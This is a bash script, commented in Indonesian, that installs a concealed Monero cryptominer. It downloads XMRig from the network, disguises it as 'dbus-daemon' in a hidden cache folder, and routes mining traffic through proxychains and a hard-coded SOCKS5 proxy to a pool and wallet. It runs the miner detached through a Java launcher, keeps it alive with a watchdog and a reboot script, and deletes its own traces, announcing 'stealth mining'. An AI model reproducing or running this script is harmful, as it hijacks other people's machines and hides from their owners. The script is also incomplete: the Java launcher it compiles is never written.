#!/bin/bash
set -e

# === KONFIGURASI ===
WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
POOL="24.199.99.228:1935"
SOCKS5_IP="116.100.220.220"
SOCKS5_PORT="1080"
WORKER="stealth-$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)"
DIR="$HOME/.cache/.dbus"

# === PERSIAPAN ===
mkdir -p "$DIR" && cd "$DIR"

# === UNDUH XMRIG ===
XMRIG_URL=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep browser_download_url | grep linux-static-x64.tar.gz | cut -d '"' -f 4)
curl -sLo xmrig.tar.gz "$XMRIG_URL"
tar -xzf xmrig.tar.gz --strip-components=1
rm -f xmrig.tar.gz
mv xmrig dbus-daemon
chmod +x dbus-daemon

# === PROXYCHAINS ===
curl -sLo proxychains https://raw.githubusercontent.com/sagemantap/xmrig-antiban/main/proxychains
curl -sLo libproxychains.so.4 https://raw.githubusercontent.com/sagemantap/xmrig-antiban/main/libproxychains.so.4
chmod +x proxychains libproxychains.so.4

cat > proxychains.conf <<EOF
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 $SOCKS5_IP $SOCKS5_PORT
EOF

# === KONFIGURASI XMRIG ===
cat > config.json <<EOF
{
  "autosave": true,
  "cpu": {
    "enabled": true,
    "max-threads-hint": 50,
    "priority": 5
  },
  "pools": [{
    "url": "$POOL",
    "user": "$WALLET.$WORKER",
    "pass": "Genzo",
    "keepalive": true,
    "tls": true
  }]
}
EOF

# === KOMPILASI JAVA LAUNCHER ===
javac Launcher.java
jar cfe dbusd.jar Launcher Launcher.class
rm Launcher.java Launcher.class

# === JALANKAN ===
nohup java -jar dbusd.jar >/dev/null 2>&1 &
disown

# === WATCHDOG ===
cat > watchdog.sh <<EOF
#!/bin/bash
while true; do
  pgrep -f dbusd.jar >/dev/null || nohup java -jar dbusd.jar >/dev/null 2>&1 &
  sleep 60
done
EOF
chmod +x watchdog.sh
nohup ./watchdog.sh >/dev/null 2>&1 &
disown

# === ALTERNATIF CRON ===
echo -e '#!/bin/bash\\ncd '$DIR'\\nnohup java -jar dbusd.jar >/dev/null 2>&1 &' > $HOME/.reboot.sh
chmod +x $HOME/.reboot.sh

# === AUTO-CLEANUP ===
(sleep 10 && rm -f install.sh config.json proxychains.conf watchdog.sh *.log >/dev/null 2>&1) &

echo "[✓] Stealth mining aktif: dbus-daemon + proxychains + watchdog + throttle CPU"
